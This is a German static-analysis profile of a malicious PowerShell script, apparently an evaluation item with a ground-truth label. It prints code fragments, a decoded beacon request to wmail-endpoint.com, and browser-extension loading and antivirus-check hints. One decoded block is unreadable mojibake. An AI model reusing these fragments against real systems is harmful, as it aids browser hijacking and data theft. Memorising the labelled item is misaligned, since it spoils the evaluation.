# Steckbrief: 0bbce92b547f0e99a37636b090cb05d9633cc05e1ce876e0076ca32dc4c901c4.ps1

- SHA256: `0bbce92b547f0e99a37636b090cb05d9633cc05e1ce876e0076ca32dc4c901c4`
- Groesse: 29490 Bytes, 397 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 40 (Auszug unten)
- Base64-Bloecke gesamt: 2, davon dekodierbar: 2
- Strings (Auszug):
  - `Z2V0IC92Mi8wZjNhNTRlYy00MTkxLTRmZWItOTc5MS04MmY5MTI3NzQ5OGU/dj12ZXIlNWYyIGh0dHAvMS4xDQpob3N0OiB3bWFpbC1lbmRwb2ludC5jb20N`
  - `6626b3d5-9306-45cb-91ca-3e86a88840e2`
  - ``r`n`
  - `;
$http_request.path = $_requestline[1].Replace(`
  - `).Replace(`
  - `);

for ($i = 1; $i -lt $_headers.Length; $i++) {
    [string[]]$h = $_headers[$i] -split `
  - `;
    if ($h.Length -lt 2) {
        break;
    }
    $http_headers[$h[0]] = $h[1];
}

$user_auth = @{
    id = `
  - `

function WMI {
    param (
        $namespace,
        $class
    )
    try {
        return Get-WmiObject -Na`
  - `\s?--load-extension=(("[^\r\n"]*")|([^\r\n\s]*))`
  - `*.LNK`
  - `OrdinalIgnoreCase`
  - `');
                        $enabled = ((Test-Path $path) -eq $true);
                    }
                }
      `
  - `,
    `
  - `
);

$searchEntries = @(
    [pscustomobject]@{
        root    = '%appdata%'
        targets =
        [pscustom`
  - `);
    }

    foreach ($entry in $searchEntries) {
        $rootdir = [System.Environment]::ExpandEnvironmentVariabl`
- Dekodierter Base64-Block (Laenge 684):
  ```
  get /v2/0f3a54ec-4191-4feb-9791-82f91277498e?v=ver%5f2 http/1.1
host: wmail-endpoint.com
connection: keep-alive
pragma: no-cache
cache-control: no-cache
upgrade-insecure-requests: 1
user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.71 safari/537.36
accept-language: en-us,en;q=0.9
accept: text/html,application/xhtml+xml,application
  ```
- Dekodierter Base64-Block (Laenge 16960):
  ```
  卛獹整⹭湅楶潲浮湥嵴㨺畃牲湥䑴物捥潴祲㴠␠坐⹄慐桴഻䄊摤吭灹⁥倭瑡⁨␢湥㩶楷摮物䵜捩潲潳瑦丮呅䙜慲敭潷歲㐶癜⸴⸰〳ㄳ尹祓瑳浥刮湵楴敭搮汬㬢਍摁ⵤ祔数ⴠ慐桴∠攤癮眺湩楤屲楍牣獯景⹴䕎屔牆浡睥牯㙫尴㑶〮㌮㌰㤱卜獹整⹭畒瑮浩⹥湉整潲印牥楶散⹳汤≬഻ഊ␊牣慥整乤睥㴠␠牴敵഻␊畭整乸浡⁥‽䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧卛獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹䡓㉁㘵㩝䌺敲瑡⡥⸩潃灭瑵䡥獡⡨呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㔴㔹␱␨湥㩶佃偍呕剅䅎䕍ㄩ㠲㔸⠤攤癮唺䕓乒䵁⥅㌲㤴⤢⤩഻␊畭整⁸‽卛獹整⹭桔敲摡湩⹧畍整嵸㨺敮⡷琤畲ⱥ␠畭整乸浡ⱥ嬠敲嵦挤敲瑡摥敎⥷഻椊⁦␨牣慥整乤睥ⴠ煥␠慦獬⥥笠਍††敲畴湲഻紊਍਍愤獳浥汢敩⁳‽敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭潃汬捥楴湯⹳敇敮楲⹣楄瑣潩慮祲嬧瑳楲杮‬祓瑳浥刮晥敬瑣潩⹮獁敳扭祬❝ⴠ牁畧敭瑮楌瑳⠠卛牴湩䍧浯慰敲嵲㨺牏楤慮䥬湧牯䍥獡⥥਍潦敲捡⁨␨獡敳扭祬椠⁮嬨灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敇䅴
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - frombase64: 3
- URLs: `http://wmail-endpoint.com`
- Pfade: `$env:ALLUSERSPROFILE\Microsoft\Windows\Start`, `$env:APPDATA\Microsoft\Internet`, `$env:APPDATA\Microsoft\Windows\Start`, `$env:PUBLIC\Desktop`, `$env:USERDOMAIN`, `$env:USERNAME`, `$env:USERPROFILE\Desktop`, `$env:USERPROFILE\OneDrive\Desktop`
- Cmdlets: Brave-Browser, Build-Request, Get-Apps, Get-AvStatus, Get-ChildItem, Get-InstallStatus, Get-Random, Get-UserID, Get-UserId, Get-UserInfo, Get-WmiObject, Join-Path, New-Object, Resolve-Path, Run-Command, Select-String, Start-Job, Start-Sleep, Test-Path, Wait-Job

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. Base64-Inhalt dekodieren
- Dekodierte Befehle (Auszug):
  ```
  get /v2/0f3a54ec-4191-4feb-9791-82f91277498e?v=ver%5f2 http/1.1
host: wmail-endpoint.com
connection: keep-alive
pragma: no-cache
cache-control: no-cache
upgrade-insecure-requests: 1
user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.71 safari/537.36
accept-language: en-us,en;q=0.9
accept: text/html,application/xhtml+xml,application
  ```
  ```
  卛獹整⹭湅楶潲浮湥嵴㨺畃牲湥䑴物捥潴祲㴠␠坐⹄慐桴഻䄊摤吭灹⁥倭瑡⁨␢湥㩶楷摮物䵜捩潲潳瑦丮呅䙜慲敭潷歲㐶癜⸴⸰〳ㄳ尹祓瑳浥刮湵楴敭搮汬㬢਍摁ⵤ祔数ⴠ慐桴∠攤癮眺湩楤屲楍牣獯景⹴䕎屔牆浡睥牯㙫尴㑶〮㌮㌰㤱卜獹整⹭畒瑮浩⹥湉整潲印牥楶散⹳汤≬഻ഊ␊牣慥整乤睥㴠␠牴敵഻␊畭整乸浡⁥‽䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧卛獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹䡓㉁㘵㩝䌺敲瑡⡥⸩潃灭瑵䡥獡⡨呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㔴㔹␱␨湥㩶佃偍呕剅䅎䕍ㄩ㠲㔸⠤攤癮唺䕓乒䵁⥅㌲㤴⤢⤩഻␊畭整⁸‽卛獹整⹭桔敲摡湩⹧畍整嵸㨺敮⡷琤畲ⱥ␠畭整乸浡ⱥ嬠敲嵦挤敲瑡摥敎⥷഻椊⁦␨牣慥整乤睥ⴠ煥␠慦獬⥥笠਍††敲畴湲഻紊਍਍愤獳浥汢敩⁳‽敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭潃汬捥楴湯⹳敇敮楲⹣楄瑣潩慮祲嬧瑳楲杮‬祓瑳浥刮晥敬瑣潩⹮獁敳扭祬❝ⴠ牁畧敭瑮楌瑳⠠卛牴湩䍧浯慰敲嵲㨺牏楤慮䥬湧牯䍥獡⥥਍潦敲捡⁨␨獡敳扭祬椠⁮嬨灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敇䅴
  ```
